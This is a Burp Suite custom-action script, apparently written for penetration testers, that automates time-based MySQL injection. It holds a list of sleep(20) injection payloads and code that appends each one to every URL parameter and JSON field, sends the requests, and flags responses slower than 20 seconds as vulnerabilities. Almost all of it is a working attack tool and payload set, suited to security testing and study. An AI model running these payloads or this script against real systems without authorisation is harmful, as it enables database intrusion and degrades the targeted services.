id: d5e4e6f8-b728-4bc1-9685-6c2cf9a8fbe0
name: MySQL Time-Based Repeater
function: CUSTOM_ACTION
location: REPEATER
source: |+
  /**
  * Append a time-based MySQL payload to each query parameter, one at a time.
  * Sends each mutated request sequentially and logs high-level timing data
  * so you can watch for slow responses in Logger or the console.
  * Also reports the findings to the Issues dashboard.
  * Handles both regular parameters and JSON-encoded parameters.
  * @author slicingmelon
  **/

  var payloads = java.util.List.of(
    //"'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z",
    "'XOR(if(isnull(nullif(now(),sysdate())),sleep(20),0))XOR'Z",
    "'(select(1)from(select(sleep(20)))a)'",
    "(select(1)from(select(sleep(20)))a)",
    "(select(1)from(select(sleep(20)))a)-- z",
    //"'+(select(1)from(select(sleep(20)))a)+'",
    "-(select(1)from(select(sleep(20)))a)",
    ",(select(1)from(select(sleep(20)))a)",
    ",(select(1)from(select(sleep(20)))a)-- z",
    //"'OR(select(1)from(select(sleep(20)))a)OR'Z",
    "'AND(select(1)from(select(sleep(20)))a)AND'Z",
    " AND (select(1)from(select(sleep(20)))a)-- z",
    "' AND (select(1)from(select(sleep(20)))a)-- z",
    ") AND (select(1)from(select(sleep(20)))a)-- z",
    "') AND (select(1)from(select(sleep(20)))a)-- z",
    "->test\"',(select(1)from(select(sleep(20)))a)-- z\"'",
    //"->test\"'))# (select(1)from(select(sleep(20)))a)-- z",
    "->test\"' ASC, (select(1)from(select(sleep(20)))a)) DESC-- z\"'",
    "->test\"') XOR (select(1)from(select(sleep(20)))a)-- z\"'"
  );

  var bypassCache = true;
  var detectionThresholdMs = 20000L;

  var detectionFound = false;

  // Custom URL encode - only encodes space, +, #, = (characters that break URL structure)
  var customUrlEncode = (java.util.function.Function<String, String>)(str -> {
    return str.replace(" ", "%20")
              .replace("+", "%2b")
              .replace("#", "%23")
              .replace("=", "%3D");
  });

  // Helper function to minify JSON (remove pretty-print formatting from toJsonString())
  // Safe because: actual newlines/tabs only exist in formatting, NOT inside JSON string values
  // (String values have escaped \n as two chars: backslash+n, not actual newline byte)
  var minifyJson = (java.util.function.Function<String, String>)(jsonStr -> {
    return jsonStr.replace("\n", "")          // Remove newlines
                  .replace("\r", "")          // Remove carriage returns
                  .replaceAll("\\{\\s+", "{")    // Remove spaces after {
                  .replaceAll("\\[\\s+", "[")    // Remove spaces after [
                  .replaceAll("\\s+\\}", "}")    // Remove spaces before }
                  .replaceAll("\\s+\\]", "]")    // Remove spaces before ]
                  .replaceAll(",\\s+", ",")      // Remove spaces after ,
                  .replaceAll(":\\s+", ":");     // Remove spaces after :
  });

  // Helper function to inject payload into a JSON string
  var injectIntoJson = (java.util.function.BiFunction<String, String, java.util.List<java.util.Map.Entry<String, String>>>)((jsonStr, payload) -> {
    var results = new java.util.ArrayList<java.util.Map.Entry<String, String>>();
    try {
      var jsonNode = JsonNode.jsonNode(jsonStr);
      var jsonObj = jsonNode.asObject();
      var jsonMap = jsonObj.asMap();
      
      // Iterate through each field in the JSON object
      for (var entry : jsonMap.entrySet()) {
        String targetKey = entry.getKey();
        var targetValueNode = entry.getValue();
        
        // Handle different field types
        if (targetValueNode.isString() || targetValueNode.isNull()) {
          String originalValue = targetValueNode.isString() ? targetValueNode.asString() : "";
          boolean isEmpty = originalValue.isEmpty();
          
          // Test 1: Inject as string
          var newJsonObj = JsonObjectNode.jsonObjectNode();
          for (var e : jsonMap.entrySet()) {
            String k = e.getKey();
            var valueNode = e.getValue();
            
            if (k.equals(targetKey)) {
              String origVal = valueNode.isString() ? valueNode.asString() : "";
              newJsonObj.putString(k, origVal + payload);
            } else {
              // Preserve original value with correct type
              if (valueNode.isString()) {
                newJsonObj.putString(k, valueNode.asString());
              } else if (valueNode.isNull()) {
                newJsonObj.put(k, JsonNullNode.jsonNullNode());
              } else {
                newJsonObj.put(k, valueNode);
              }
            }
          }
          String mutatedJsonStr = minifyJson.apply(newJsonObj.toJsonString());
          results.add(new java.util.AbstractMap.SimpleEntry<>(targetKey, mutatedJsonStr));
          
          // Test 2: If field is empty, also try as array (we don't know if backend expects string or array)
          if (isEmpty) {
            var newJsonObjArray = JsonObjectNode.jsonObjectNode();
            for (var e : jsonMap.entrySet()) {
              String k = e.getKey();
              var valueNode = e.getValue();
              
              if (k.equals(targetKey)) {
                // Create array with payload
                var payloadArray = JsonArrayNode.jsonArrayNode();
                payloadArray.addString(payload);
                newJsonObjArray.put(k, payloadArray);
              } else {
                // Preserve original value with correct type
                if (valueNode.isString()) {
                  newJsonObjArray.putString(k, valueNode.asString());
                } else if (valueNode.isNull()) {
                  newJsonObjArray.put(k, JsonNullNode.jsonNullNode());
                } else {
                  newJsonObjArray.put(k, valueNode);
                }
              }
            }
            String mutatedJsonStrArray = minifyJson.apply(newJsonObjArray.toJsonString());
            results.add(new java.util.AbstractMap.SimpleEntry<>(targetKey + "[]", mutatedJsonStrArray));
          }
          
        } else if (targetValueNode.isArray()) {
          // Inject into each string element in the array
          var targetArray = targetValueNode.asArray();
          int arraySize = targetArray.asList().size();
          
          for (int i = 0; i < arraySize; i++) {
            var arrayElement = targetArray.get(i);
            
            // Only inject into string elements
            if (arrayElement.isString() || arrayElement.isNull()) {
              var newJsonObj = JsonObjectNode.jsonObjectNode();
              
              for (var e : jsonMap.entrySet()) {
                String k = e.getKey();
                var valueNode = e.getValue();
                
                if (k.equals(targetKey)) {
                  // Create new array with payload injected at index i
                  var newArray = JsonArrayNode.jsonArrayNode();
                  for (int j = 0; j < arraySize; j++) {
                    var elem = targetArray.get(j);
                    if (j == i) {
                      String originalValue = elem.isString() ? elem.asString() : "";
                      newArray.addString(originalValue + payload);
                    } else {
                      if (elem.isString()) {
                        newArray.addString(elem.asString());
                      } else if (elem.isNull()) {
                        newArray.add(JsonNullNode.jsonNullNode());
                      } else {
                        newArray.add(elem);
                      }
                    }
                  }
                  newJsonObj.put(k, newArray);
                } else {
                  // Preserve original value
                  if (valueNode.isString()) {
                    newJsonObj.putString(k, valueNode.asString());
                  } else if (valueNode.isNull()) {
                    newJsonObj.put(k, JsonNullNode.jsonNullNode());
                  } else {
                    newJsonObj.put(k, valueNode);
                  }
                }
              }
              
              String mutatedJsonStr = minifyJson.apply(newJsonObj.toJsonString());
              results.add(new java.util.AbstractMap.SimpleEntry<>(targetKey + "[" + i + "]", mutatedJsonStr));
            }
          }
        }
        // Skip object, number, boolean fields for now (can be extended if needed)
      }
    } catch (Exception e) {
      logging().logToError("[MySQLTimeBased] Failed to parse JSON: " + e.getMessage());
    }
    return results;
  });

  var baseRequest = requestResponse.request();
  if (baseRequest == null) return;

  // Get all URL parameters (order preserved by Montoya API)
  var urlParameters = baseRequest.parameters().stream()
    .filter(p -> p.type() == HttpParameterType.URL)
    .toList();

  if (urlParameters.isEmpty()) {
    logging().logToOutput("[MySQLTimeBased] No URL parameters found.");
    return;
  }

  var alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";

  logging().logToOutput("[MySQLTimeBased] Started...");

  for (HttpParameter parameter : urlParameters) {
    String name = parameter.name();
    String value = parameter.value();
    
    // URL decode the value to check if it's JSON
    var decodedValue = api().utilities().urlUtils().decode(value);
    
    // Check if it's a JSON object
    if (decodedValue != null && !decodedValue.isEmpty() && 
        decodedValue.strip().startsWith("{") && decodedValue.strip().endsWith("}") &&
        api().utilities().jsonUtils().isValidJson(decodedValue)) {
      // Handle JSON parameter - inject into each JSON field
      logging().logToOutput("[MySQLTimeBased] Detected JSON parameter: " + name);
      
      for (String payload : payloads) {
        var jsonMutations = injectIntoJson.apply(decodedValue, payload);
        
        for (var jsonMutation : jsonMutations) {
          var jsonField = jsonMutation.getKey();
          var mutatedJson = jsonMutation.getValue();
          
          // URL encode the mutated JSON (standard encoding for JSON)
          var encodedMutatedJson = api().utilities().urlUtils().encode(mutatedJson);
          
          // Create new parameter with mutated JSON
          var newParam = HttpParameter.urlParameter(name, encodedMutatedJson);
          
          // Update parameter in place (order preserved!)
          var mutatedRequest = baseRequest.withParameter(newParam);
          
          // Add cache buster if enabled
          if (bypassCache) {
            var cacheBuster = api().utilities().randomUtils().randomString(14, alphabet);
            mutatedRequest = mutatedRequest.withAddedParameters(
              HttpParameter.urlParameter("_czb", cacheBuster)
            );
          }
          
          var result = api().http().sendRequest(mutatedRequest);
          if (!result.hasResponse()) {
            logging().logToOutput("[WARN] No response for param " + name + " (JSON field: " + jsonField + ")");
            continue;
          }
          
          var timingOpt = result.timingData();
          if (timingOpt.isEmpty()) continue;
          
          var timing = timingOpt.get();
          java.time.Duration tStart = timing.timeBetweenRequestSentAndStartOfResponse();
          java.time.Duration tEnd = timing.timeBetweenRequestSentAndEndOfResponse();
          long startMs = (tStart != null ? tStart.toMillis() : -1);
          long endMs = (tEnd != null ? tEnd.toMillis() : -1);
          
          if (startMs >= detectionThresholdMs && startMs != -1) {
            logging().logToOutput("[MySQLTimeBased] SQL injection detected in JSON param " + name + ", field: " + jsonField + ", payload: " + payload);
            //httpEditor.responsePane().set(result.response().toByteArray());
            //httpEditor.requestPane().set(mutatedRequest.toByteArray());
            detectionFound = true;
            
            // Find payload position in request for red marker highlighting (using ByteArray for efficiency)
            var reqBytes = mutatedRequest.toByteArray();
            var urlEncodedPayload = api().utilities().urlUtils().encode(payload);
            var payloadIndex = reqBytes.indexOf(payload);
            var payloadLength = payload.length();
            if (payloadIndex == -1) {
              payloadIndex = reqBytes.indexOf(urlEncodedPayload);
              payloadLength = urlEncodedPayload.length();
            }
            
            var markedResult = result;
            if (payloadIndex != -1) {
              markedResult = result.withRequestMarkers(
                Marker.marker(Range.range(payloadIndex, payloadIndex + payloadLength))
              );
            }
            
            var detail = String.format("JSON parameter '%s', field '%s' was vulnerable to time-based SQL injection when payload '%s' was used (response took %dms).", name, jsonField, payload, endMs);
            api().siteMap().add(
              burp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue(
                "MySQL Time Based Injection (JSON)",
                detail,
                "Sanitize input to prevent SQL injections.",
                mutatedRequest.url(),
                burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,
                burp.api.montoya.scanner.audit.issues.AuditIssueConfidence.CERTAIN,
                "",
                "",
                burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,
                markedResult
              )
            );
          }
        }
      }
    } else {
      // Handle regular parameter - inject directly
      for (String payload : payloads) {
        // Custom URL encode the payload (only space, +, #, =)
        var encodedPayload = customUrlEncode.apply(payload);
        
        // Create new parameter with payload appended
        var newParam = HttpParameter.urlParameter(name, value + encodedPayload);
        
        // Update parameter in place (order preserved!)
        var mutatedRequest = baseRequest.withParameter(newParam);
        
        // Add cache buster if enabled
        if (bypassCache) {
          var cacheBuster = api().utilities().randomUtils().randomString(14, alphabet);
          mutatedRequest = mutatedRequest.withAddedParameters(
            HttpParameter.urlParameter("_czb", cacheBuster)
          );
        }
        
        var result = api().http().sendRequest(mutatedRequest);
        if (!result.hasResponse()) {
          logging().logToOutput("[WARN] No response for param " + name);
          continue;
        }
        
        var timingOpt = result.timingData();
        if (timingOpt.isEmpty()) continue;
        
        var timing = timingOpt.get();
        java.time.Duration tStart = timing.timeBetweenRequestSentAndStartOfResponse();
        java.time.Duration tEnd = timing.timeBetweenRequestSentAndEndOfResponse();
        long startMs = (tStart != null ? tStart.toMillis() : -1);
        long endMs = (tEnd != null ? tEnd.toMillis() : -1);
        
        if (startMs >= detectionThresholdMs && startMs != -1) {
          logging().logToOutput("[MySQLTimeBased] SQL injection detected in param " + name + " using payload: " + payload);
          detectionFound = true;
          
          // Find payload position in request for red marker highlighting (using ByteArray for efficiency)
          // Try multiple encoding variations since Burp may fully encode special chars
          var reqBytes = mutatedRequest.toByteArray();
          var payloadIndex = reqBytes.indexOf(encodedPayload);
          var payloadLength = encodedPayload.length();
          if (payloadIndex == -1) {
            // Try fully URL-encoded version (for payloads with special chars like " ' , etc.)
            var fullyEncodedPayload = api().utilities().urlUtils().encode(payload);
            payloadIndex = reqBytes.indexOf(fullyEncodedPayload);
            payloadLength = fullyEncodedPayload.length();
          }
          if (payloadIndex == -1) {
            // Fallback to raw payload
            payloadIndex = reqBytes.indexOf(payload);
            payloadLength = payload.length();
          }
          
          var markedResult = result;
          if (payloadIndex != -1) {
            markedResult = result.withRequestMarkers(
              Marker.marker(Range.range(payloadIndex, payloadIndex + payloadLength))
            );
          }
          
          var detail = String.format("Parameter '%s' was vulnerable to time-based SQL injection when payload '%s' was used (response took %dms).", name, payload, endMs);
          api().siteMap().add(
            burp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue(
              "MySQL Time Based Injection",
              detail,
              "Sanitize input to prevent SQL injections.",
              mutatedRequest.url(),
              burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,
              burp.api.montoya.scanner.audit.issues.AuditIssueConfidence.CERTAIN,
              "",
              "",
              burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,
              markedResult
            )
          );
        }
      }
    }
  }

  if (!detectionFound) {
    logging().logToOutput("[MySQLTimeBased] No findings.");
  }

